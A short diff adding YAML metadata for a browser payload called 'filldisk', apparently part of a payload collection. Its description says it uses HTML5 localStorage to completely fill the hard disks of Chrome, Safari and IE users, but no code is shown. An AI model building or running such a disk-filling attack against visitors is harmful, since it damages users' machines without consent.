@@ -1,0 +1,6 @@
+name: filldisk
+description: >
+  Use HTML5 localStorage to completely fill up Chrome, Safari, and IE users' hard disks.
+author: samdenty99
+minify: true
+params: >
